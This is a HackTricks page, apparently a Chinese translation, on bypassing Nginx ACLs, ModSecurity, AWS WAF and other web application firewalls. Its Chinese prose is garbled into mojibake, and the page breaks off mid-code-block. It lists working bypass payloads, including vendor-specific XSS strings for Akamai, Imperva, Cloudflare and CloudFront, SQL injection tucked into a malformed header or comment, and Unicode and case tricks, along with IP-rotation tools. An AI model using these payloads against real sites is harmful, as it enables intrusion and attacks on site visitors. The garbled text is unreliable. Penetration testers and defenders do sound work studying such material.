<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Proxy / WAF Protections Bypass</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="proxy--waf-protections-bypass"><a class="header" href="#proxy--waf-protections-bypass">Proxy / WAF Protections Bypass</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
<p>{% embed url="https://websec.nl/" %}</p>
<h2 id="é€šè¿‡è·¯å¾„åæ“ä½œç»•è¿‡-nginx-acl-è§„åˆ™"><a class="header" href="#é€šè¿‡è·¯å¾„åæ“ä½œç»•è¿‡-nginx-acl-è§„åˆ™">é€šè¿‡è·¯å¾„åæ“ä½œç»•è¿‡ Nginx ACL è§„åˆ™ <a href="#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" id="heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules"></a></a></h2>
<p>æŠ€æœ¯ <a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies">æ¥è‡ªè¿™é¡¹ç ”ç©¶</a>ã€‚</p>
<p>Nginx è§„åˆ™ç¤ºä¾‹ï¼š</p>
<pre><code class="language-plaintext">location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
</code></pre>
<p>ä¸ºäº†é˜²æ­¢ç»•è¿‡ï¼ŒNginx åœ¨æ£€æŸ¥è·¯å¾„ä¹‹å‰æ‰§è¡Œè·¯å¾„è§„èŒƒåŒ–ã€‚ç„¶è€Œï¼Œå¦‚æœåç«¯æœåŠ¡å™¨æ‰§è¡Œä¸åŒçš„è§„èŒƒåŒ–ï¼ˆç§»é™¤ Nginx ä¸ç§»é™¤çš„å­—ç¬¦ï¼‰ï¼Œåˆ™å¯èƒ½ç»•è¿‡æ­¤é˜²å¾¡ã€‚</p>
<h3 id="nodejs---express"><a class="header" href="#nodejs---express"><strong>NodeJS - Express</strong></a></h3>
<div class="table-wrapper"><table><thead><tr><th>Nginx ç‰ˆæœ¬</th><th><strong>Node.js ç»•è¿‡å­—ç¬¦</strong></th></tr></thead><tbody>
<tr><td>1.22.0</td><td><code>\xA0</code></td></tr>
<tr><td>1.21.6</td><td><code>\xA0</code></td></tr>
<tr><td>1.20.2</td><td><code>\xA0</code>, <code>\x09</code>, <code>\x0C</code></td></tr>
<tr><td>1.18.0</td><td><code>\xA0</code>, <code>\x09</code>, <code>\x0C</code></td></tr>
<tr><td>1.16.1</td><td><code>\xA0</code>, <code>\x09</code>, <code>\x0C</code></td></tr>
</tbody></table>
</div>
<h3 id="flask"><a class="header" href="#flask"><strong>Flask</strong></a></h3>
<div class="table-wrapper"><table><thead><tr><th>Nginx ç‰ˆæœ¬</th><th><strong>Flask ç»•è¿‡å­—ç¬¦</strong></th></tr></thead><tbody>
<tr><td>1.22.0</td><td><code>\x85</code>, <code>\xA0</code></td></tr>
<tr><td>1.21.6</td><td><code>\x85</code>, <code>\xA0</code></td></tr>
<tr><td>1.20.2</td><td><code>\x85</code>, <code>\xA0</code>, <code>\x1F</code>, <code>\x1E</code>, <code>\x1D</code>, <code>\x1C</code>, <code>\x0C</code>, <code>\x0B</code></td></tr>
<tr><td>1.18.0</td><td><code>\x85</code>, <code>\xA0</code>, <code>\x1F</code>, <code>\x1E</code>, <code>\x1D</code>, <code>\x1C</code>, <code>\x0C</code>, <code>\x0B</code></td></tr>
<tr><td>1.16.1</td><td><code>\x85</code>, <code>\xA0</code>, <code>\x1F</code>, <code>\x1E</code>, <code>\x1D</code>, <code>\x1C</code>, <code>\x0C</code>, <code>\x0B</code></td></tr>
</tbody></table>
</div>
<h3 id="spring-boot"><a class="header" href="#spring-boot"><strong>Spring Boot</strong></a></h3>
<div class="table-wrapper"><table><thead><tr><th>Nginx ç‰ˆæœ¬</th><th><strong>Spring Boot ç»•è¿‡å­—ç¬¦</strong></th></tr></thead><tbody>
<tr><td>1.22.0</td><td><code>;</code></td></tr>
<tr><td>1.21.6</td><td><code>;</code></td></tr>
<tr><td>1.20.2</td><td><code>\x09</code>, <code>;</code></td></tr>
<tr><td>1.18.0</td><td><code>\x09</code>, <code>;</code></td></tr>
<tr><td>1.16.1</td><td><code>\x09</code>, <code>;</code></td></tr>
</tbody></table>
</div>
<h3 id="php-fpm"><a class="header" href="#php-fpm"><strong>PHP-FPM</strong></a></h3>
<p>Nginx FPM é…ç½®ï¼š</p>
<pre><code class="language-plaintext">location = /admin.php {
deny all;
}

location ~ \.php$ {
include snippets/fastcgi-php.conf;
fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
</code></pre>
<p>Nginx è¢«é…ç½®ä¸ºé˜»æ­¢å¯¹ <code>/admin.php</code> çš„è®¿é—®ï¼Œä½†å¯ä»¥é€šè¿‡è®¿é—® <code>/admin.php/index.php</code> æ¥ç»•è¿‡æ­¤é™åˆ¶ã€‚</p>
<h3 id="å¦‚ä½•é˜²æ­¢"><a class="header" href="#å¦‚ä½•é˜²æ­¢">å¦‚ä½•é˜²æ­¢</a></h3>
<pre><code class="language-plaintext">location ~* ^/admin {
deny all;
}
</code></pre>
<h2 id="bypass-mod-security-rules"><a class="header" href="#bypass-mod-security-rules">Bypass Mod Security Rules <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a></a></h2>
<h3 id="path-confusion"><a class="header" href="#path-confusion">Path Confusion</a></h3>
<p><a href="https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/"><strong>åœ¨è¿™ç¯‡æ–‡ç« ä¸­</strong></a> è§£é‡Šäº† ModSecurity v3ï¼ˆç›´åˆ° 3.0.12ï¼‰<strong>é”™è¯¯åœ°å®ç°äº† <code>REQUEST_FILENAME</code></strong> å˜é‡ï¼Œè¯¥å˜é‡åº”è¯¥åŒ…å«è®¿é—®çš„è·¯å¾„ï¼ˆç›´åˆ°å‚æ•°å¼€å§‹ï¼‰ã€‚è¿™æ˜¯å› ä¸ºå®ƒæ‰§è¡Œäº† URL è§£ç ä»¥è·å–è·¯å¾„ã€‚<br />
å› æ­¤ï¼Œåƒ <code>http://example.com/foo%3f';alert(1);foo=</code> è¿™æ ·çš„è¯·æ±‚åœ¨ mod security ä¸­å°†è®¤ä¸ºè·¯å¾„åªæ˜¯ <code>/foo</code>ï¼Œå› ä¸º <code>%3f</code> è¢«è½¬æ¢ä¸º <code>?</code> ç»“æŸäº† URL è·¯å¾„ï¼Œä½†å®é™…ä¸ŠæœåŠ¡å™¨æ¥æ”¶åˆ°çš„è·¯å¾„å°†æ˜¯ <code>/foo%3f';alert(1);foo=</code>ã€‚</p>
<p>å˜é‡ <code>REQUEST_BASENAME</code> å’Œ <code>PATH_INFO</code> ä¹Ÿå—åˆ°æ­¤é”™è¯¯çš„å½±å“ã€‚</p>
<p>åœ¨ Mod Security çš„ç‰ˆæœ¬ 2 ä¸­å‘ç”Ÿäº†ç±»ä¼¼çš„æƒ…å†µï¼Œå…è®¸ç»•è¿‡ä¸€ç§ä¿æŠ¤ï¼Œè¯¥ä¿æŠ¤é˜»æ­¢ç”¨æˆ·è®¿é—®ä¸å¤‡ä»½æ–‡ä»¶ç›¸å…³çš„ç‰¹å®šæ‰©å±•åçš„æ–‡ä»¶ï¼ˆä¾‹å¦‚ <code>.bak</code>ï¼‰ï¼Œåªéœ€å‘é€ç‚¹ URL ç¼–ç ä¸º <code>%2e</code>ï¼Œä¾‹å¦‚ï¼š<code>https://example.com/backup%2ebak</code>ã€‚</p>
<h2 id="bypass-aws-waf-acl"><a class="header" href="#bypass-aws-waf-acl">Bypass AWS WAF ACL <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a></a></h2>
<h3 id="malformed-header"><a class="header" href="#malformed-header">Malformed Header</a></h3>
<p><a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies">è¿™é¡¹ç ”ç©¶</a> æåˆ°å¯ä»¥é€šè¿‡å‘é€ä¸€ä¸ªâ€œæ ¼å¼é”™è¯¯â€çš„å¤´éƒ¨æ¥ç»•è¿‡åº”ç”¨äº HTTP å¤´éƒ¨çš„ AWS WAF è§„åˆ™ï¼Œè¯¥å¤´éƒ¨æœªè¢« AWS æ­£ç¡®è§£æï¼Œä½†è¢«åç«¯æœåŠ¡å™¨è§£æã€‚</p>
<p>ä¾‹å¦‚ï¼Œå‘é€ä»¥ä¸‹è¯·æ±‚ï¼Œåœ¨å¤´éƒ¨ X-Query ä¸­åŒ…å« SQL æ³¨å…¥ï¼š</p>
<pre><code class="language-http">GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
</code></pre>
<p>å¯ä»¥ç»•è¿‡AWS WAFï¼Œå› ä¸ºå®ƒæ— æ³•ç†è§£ä¸‹ä¸€è¡Œæ˜¯å¤´éƒ¨å€¼çš„ä¸€éƒ¨åˆ†ï¼Œè€ŒNODEJSæœåŠ¡å™¨å¯ä»¥ï¼ˆè¿™ä¸ªé—®é¢˜å·²ä¿®å¤ï¼‰ã€‚</p>
<h2 id="é€šç”¨wafç»•è¿‡"><a class="header" href="#é€šç”¨wafç»•è¿‡">é€šç”¨WAFç»•è¿‡</a></h2>
<h3 id="è¯·æ±‚å¤§å°é™åˆ¶"><a class="header" href="#è¯·æ±‚å¤§å°é™åˆ¶">è¯·æ±‚å¤§å°é™åˆ¶</a></h3>
<p>é€šå¸¸ï¼ŒWAFå¯¹è¯·æ±‚çš„é•¿åº¦æœ‰ä¸€å®šçš„é™åˆ¶ï¼Œå¦‚æœPOST/PUT/PATCHè¯·æ±‚è¶…è¿‡è¯¥é™åˆ¶ï¼ŒWAFå°†ä¸ä¼šæ£€æŸ¥è¯¥è¯·æ±‚ã€‚</p>
<ul>
<li>å¯¹äºAWS WAFï¼Œæ‚¨å¯ä»¥<a href="https://docs.aws.amazon.com/waf/latest/developerguide/limits.html"><strong>æŸ¥çœ‹æ–‡æ¡£</strong></a><strong>:</strong></li>
</ul>
<table data-header-hidden><thead><tr><th width="687"></th><th></th></tr></thead><tbody><tr><td>å¯ä»¥æ£€æŸ¥çš„åº”ç”¨è´Ÿè½½å‡è¡¡å™¨å’ŒAWS AppSyncä¿æŠ¤çš„Webè¯·æ±‚ä½“çš„æœ€å¤§å¤§å°</td><td>8 KB</td></tr><tr><td>å¯ä»¥æ£€æŸ¥çš„CloudFrontã€API Gatewayã€Amazon Cognitoã€App Runnerå’ŒVerified Accessä¿æŠ¤çš„Webè¯·æ±‚ä½“çš„æœ€å¤§å¤§å°**</td><td>64 KB</td></tr></tbody></table>
<ul>
<li>æ¥è‡ª<a href="https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-waf-request-size-limits"><strong>Azureæ–‡æ¡£</strong></a><strong>:</strong></li>
</ul>
<p>è¾ƒæ—§çš„Webåº”ç”¨é˜²ç«å¢™ä½¿ç”¨æ ¸å¿ƒè§„åˆ™é›†3.1ï¼ˆæˆ–æ›´ä½ç‰ˆæœ¬ï¼‰å…è®¸å¤§äº<strong>128 KB</strong>çš„æ¶ˆæ¯ï¼Œé€šè¿‡å…³é—­è¯·æ±‚ä½“æ£€æŸ¥ï¼Œä½†è¿™äº›æ¶ˆæ¯ä¸ä¼šè¢«æ£€æŸ¥æ¼æ´ã€‚å¯¹äºè¾ƒæ–°ç‰ˆæœ¬ï¼ˆæ ¸å¿ƒè§„åˆ™é›†3.2æˆ–æ›´é«˜ç‰ˆæœ¬ï¼‰ï¼Œå¯ä»¥é€šè¿‡ç¦ç”¨æœ€å¤§è¯·æ±‚ä½“é™åˆ¶æ¥å®ç°ã€‚å½“è¯·æ±‚è¶…è¿‡å¤§å°é™åˆ¶æ—¶ï¼š</p>
<p>å¦‚æœæ˜¯<strong>é¢„é˜²æ¨¡å¼</strong>ï¼šè®°å½•å¹¶é˜»æ­¢è¯·æ±‚ã€‚<br />
å¦‚æœæ˜¯<strong>æ£€æµ‹æ¨¡å¼</strong>ï¼šæ£€æŸ¥åˆ°é™åˆ¶ï¼Œå¿½ç•¥å…¶ä½™éƒ¨åˆ†ï¼Œå¹¶åœ¨<code>Content-Length</code>è¶…è¿‡é™åˆ¶æ—¶è®°å½•ã€‚</p>
<ul>
<li>æ¥è‡ª<a href="https://community.akamai.com/customers/s/article/Can-WAF-inspect-all-arguments-and-values-in-request-body?language=en_US"><strong>Akamai</strong></a><strong>:</strong></li>
</ul>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒWAFä»…æ£€æŸ¥è¯·æ±‚çš„å‰8KBã€‚é€šè¿‡æ·»åŠ é«˜çº§å…ƒæ•°æ®ï¼Œå¯ä»¥å°†é™åˆ¶å¢åŠ åˆ°128KBã€‚</p>
<ul>
<li>æ¥è‡ª<a href="https://developers.cloudflare.com/ruleset-engine/rules-language/fields/#http-request-body-fields"><strong>Cloudflare</strong></a><strong>:</strong></li>
</ul>
<p>æœ€å¤š128KBã€‚</p>
<h3 id="æ··æ·†"><a class="header" href="#æ··æ·†">æ··æ·† <a href="#obfuscation" id="obfuscation"></a></a></h3>
<pre><code class="language-bash"># IIS, ASP Clasic
&lt;%s%cr%u0131pt&gt; == &lt;script&gt;

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
</code></pre>
<h3 id="unicode-å…¼å®¹æ€§"><a class="header" href="#unicode-å…¼å®¹æ€§">Unicode å…¼å®¹æ€§ <a href="#unicode-compatability" id="unicode-compatability"></a></a></h3>
<p>æ ¹æ® Unicode è§„èŒƒåŒ–çš„å®ç°ï¼ˆæ›´å¤šä¿¡æ¯ <a href="https://jlajara.gitlab.io/Bypass_WAF_Unicode">è¿™é‡Œ</a>ï¼‰ï¼Œå…±äº« Unicode å…¼å®¹æ€§çš„å­—ç¬¦å¯èƒ½èƒ½å¤Ÿç»•è¿‡ WAF å¹¶ä½œä¸ºé¢„æœŸçš„æœ‰æ•ˆè´Ÿè½½æ‰§è¡Œã€‚å…¼å®¹å­—ç¬¦å¯ä»¥åœ¨ <a href="https://www.compart.com/en/unicode">è¿™é‡Œ</a> æ‰¾åˆ°ã€‚</p>
<h4 id="ç¤ºä¾‹"><a class="header" href="#ç¤ºä¾‹">ç¤ºä¾‹ <a href="#example" id="example"></a></a></h4>
<pre><code class="language-bash"># under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
ï¼œimg srcâ¼p onerrorâ¼ï¼‡promptâ½1â¾ï¼‡ï¹¥  --&gt; ï¼œimg src=p onerror='prompt(1)'&gt;
</code></pre>
<h3 id="bypass-contextual-wafs-with-encodings"><a class="header" href="#bypass-contextual-wafs-with-encodings">Bypass Contextual WAFs with encodings <a href="#ip-rotation" id="ip-rotation"></a></a></h3>
<p>æ­£å¦‚åœ¨<a href="https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization"><strong>è¿™ç¯‡åšå®¢æ–‡ç« </strong></a>ä¸­æåˆ°çš„ï¼Œä¸ºäº†ç»•è¿‡èƒ½å¤Ÿç»´æŠ¤ç”¨æˆ·è¾“å…¥ä¸Šä¸‹æ–‡çš„WAFï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨WAFæŠ€æœ¯æ¥å®é™…è§„èŒƒåŒ–ç”¨æˆ·è¾“å…¥ã€‚</p>
<p>ä¾‹å¦‚ï¼Œåœ¨æ–‡ç« ä¸­æåˆ°<strong>Akamaiå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œäº†10æ¬¡URLè§£ç </strong>ã€‚å› æ­¤åƒ<code>&lt;input/%2525252525252525253e/onfocus</code>è¿™æ ·çš„å†…å®¹å°†è¢«Akamaiè§†ä¸º<code>&lt;input/&gt;/onfocus</code>ï¼Œè¿™<strong>å¯èƒ½è®¤ä¸ºæ˜¯å¯ä»¥çš„ï¼Œå› ä¸ºæ ‡ç­¾æ˜¯é—­åˆçš„</strong>ã€‚ç„¶è€Œï¼Œåªè¦åº”ç”¨ç¨‹åºæ²¡æœ‰å¯¹è¾“å…¥è¿›è¡Œ10æ¬¡URLè§£ç ï¼Œå—å®³è€…å°†çœ‹åˆ°åƒ<code>&lt;input/%25252525252525253e/onfocus</code>è¿™æ ·çš„å†…å®¹ï¼Œè¿™<strong>ä»ç„¶æœ‰æ•ˆäºXSSæ”»å‡»</strong>ã€‚</p>
<p>å› æ­¤ï¼Œè¿™å…è®¸åœ¨WAFå°†è§£ç å’Œè§£é‡Šçš„ç¼–ç ç»„ä»¶ä¸­<strong>éšè—æœ‰æ•ˆè´Ÿè½½</strong>ï¼Œè€Œå—å®³è€…åˆ™ä¸ä¼šã€‚</p>
<p>æ­¤å¤–ï¼Œè¿™ä¸ä»…å¯ä»¥é€šè¿‡URLç¼–ç çš„æœ‰æ•ˆè´Ÿè½½æ¥å®ç°ï¼Œè¿˜å¯ä»¥é€šè¿‡å…¶ä»–ç¼–ç æ–¹å¼ï¼Œå¦‚unicodeã€hexã€octalç­‰ã€‚</p>
<p>åœ¨æ–‡ç« ä¸­å»ºè®®äº†ä»¥ä¸‹æœ€ç»ˆç»•è¿‡æ–¹æ³•ï¼š</p>
<ul>
<li>Akamai:<code>akamai.com/?x=&lt;x/%u003e/tabindex=1 autofocus/onfocus=x=self;x['ale'%2b'rt'](999)&gt;</code></li>
<li>Imperva:<code>imperva.com/?x=&lt;x/\x3e/tabindex=1 style=transition:0.1s autofocus/onfocus="a=document;b=a.defaultView;b.ontransitionend=b['aler'%2b't'];style.opacity=0;Object.prototype.toString=x=&gt;999"&gt;</code></li>
<li>AWS/Cloudfront:<code>docs.aws.amazon.com/?x=&lt;x/%26%23x3e;/tabindex=1 autofocus/onfocus=alert(999)&gt;</code></li>
<li>Cloudflare:<code>cloudflare.com/?x=&lt;x tabindex=1 autofocus/onfocus="style.transition='0.1s';style.opacity=0;self.ontransitionend=alert;Object.prototype.toString=x=&gt;999"&gt;</code></li>
</ul>
<p>è¿˜æåˆ°ï¼Œæ ¹æ®<strong>æŸäº›WAFå¦‚ä½•ç†è§£ç”¨æˆ·è¾“å…¥çš„ä¸Šä¸‹æ–‡</strong>ï¼Œå¯èƒ½ä¼šæœ‰åˆ©ç”¨çš„ç©ºé—´ã€‚åšå®¢ä¸­æå‡ºçš„ä¾‹å­æ˜¯Akamaiå…è®¸åœ¨<code>/*</code>å’Œ<code>*/</code>ä¹‹é—´æ”¾ç½®ä»»ä½•å†…å®¹ï¼ˆå¯èƒ½æ˜¯å› ä¸ºè¿™é€šå¸¸ç”¨ä½œæ³¨é‡Šï¼‰ã€‚å› æ­¤ï¼Œåƒ<code>/*'or sleep(5)-- -*/</code>è¿™æ ·çš„SQLæ³¨å…¥å°†ä¸ä¼šè¢«æ•è·ï¼Œå¹¶ä¸”å°†æœ‰æ•ˆï¼Œå› ä¸º<code>/*</code>æ˜¯æ³¨å…¥çš„èµ·å§‹å­—ç¬¦ä¸²ï¼Œè€Œ<code>*/</code>è¢«æ³¨é‡Šæ‰ã€‚</p>
<p>è¿™äº›ä¸Šä¸‹æ–‡é—®é¢˜ä¹Ÿå¯ä»¥ç”¨æ¥<strong>åˆ©ç”¨å…¶ä»–æ¯”WAFé¢„æœŸçš„æ¼æ´</strong>ï¼ˆä¾‹å¦‚ï¼Œè¿™ä¹Ÿå¯ä»¥ç”¨æ¥åˆ©ç”¨XSSï¼‰ã€‚</p>
<h3 id="h2c-smuggling"><a class="header" href="#h2c-smuggling">H2C Smuggling <a href="#ip-rotation" id="ip-rotation"></a></a></h3>
<p>{% content-ref url="h2c-smuggling.md" %}
<a href="h2c-smuggling.html">h2c-smuggling.md</a>
{% endcontent-ref %}</p>
<h3 id="ip-rotation"><a class="header" href="#ip-rotation">IP Rotation <a href="#ip-rotation" id="ip-rotation"></a></a></h3>
<ul>
<li><a href="https://github.com/ustayready/fireprox">https://github.com/ustayready/fireprox</a>: ç”Ÿæˆä¸€ä¸ªAPIç½‘å…³URLä»¥ä¸ffufä¸€èµ·ä½¿ç”¨</li>
<li><a href="https://github.com/rootcathacking/catspin">https://github.com/rootcathacking/catspin</a>: ç±»ä¼¼äºfireprox</li>
<li><a href="https://github.com/PortSwigger/ip-rotate">https://github.com/PortSwigger/ip-rotate</a>: ä½¿ç”¨APIç½‘å…³IPçš„Burp Suiteæ’ä»¶</li>
<li><a href="https://github.com/fyoorer/ShadowClone">https://github.com/fyoorer/ShadowClone</a>: æ ¹æ®è¾“å…¥æ–‡ä»¶å¤§å°å’Œæ‹†åˆ†å› å­åŠ¨æ€ç¡®å®šçš„å®¹å™¨å®ä¾‹æ•°é‡è¢«æ¿€æ´»ï¼Œè¾“å…¥è¢«æ‹†åˆ†ä¸ºå—ä»¥è¿›è¡Œå¹¶è¡Œæ‰§è¡Œï¼Œä¾‹å¦‚100ä¸ªå®ä¾‹å¤„ç†æ¥è‡ª10,000è¡Œè¾“å…¥æ–‡ä»¶çš„100ä¸ªå—ï¼Œæ‹†åˆ†å› å­ä¸º100è¡Œã€‚</li>
<li><a href="https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization">https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization</a></li>
</ul>
<h3 id="regex-bypasses"><a class="header" href="#regex-bypasses">Regex Bypasses</a></h3>
<p>å¯ä»¥ä½¿ç”¨ä¸åŒçš„æŠ€æœ¯æ¥ç»•è¿‡é˜²ç«å¢™ä¸Šçš„æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤å™¨ã€‚ç¤ºä¾‹åŒ…æ‹¬äº¤æ›¿å¤§å°å†™ã€æ·»åŠ æ¢è¡Œç¬¦å’Œç¼–ç æœ‰æ•ˆè´Ÿè½½ã€‚å„ç§ç»•è¿‡çš„èµ„æºå¯ä»¥åœ¨<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads">PayloadsAllTheThings</a>å’Œ<a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html">OWASP</a>ä¸­æ‰¾åˆ°ã€‚ä»¥ä¸‹ç¤ºä¾‹æ¥è‡ª<a href="https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2">è¿™ç¯‡æ–‡ç« </a>ã€‚</p>
<pre><code class="language-bash">&lt;sCrIpT&gt;alert(XSS)&lt;/sCriPt&gt; #changing the case of the tag
&lt;&lt;script&gt;alert(XSS)&lt;/script&gt; #prepending an additional "&lt;"
&lt;script&gt;alert(XSS) // #removing the closing tag
&lt;script&gt;alert`XSS`&lt;/script&gt; #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
&lt;iframe src=http://malicous.com &lt; #double open angle brackets
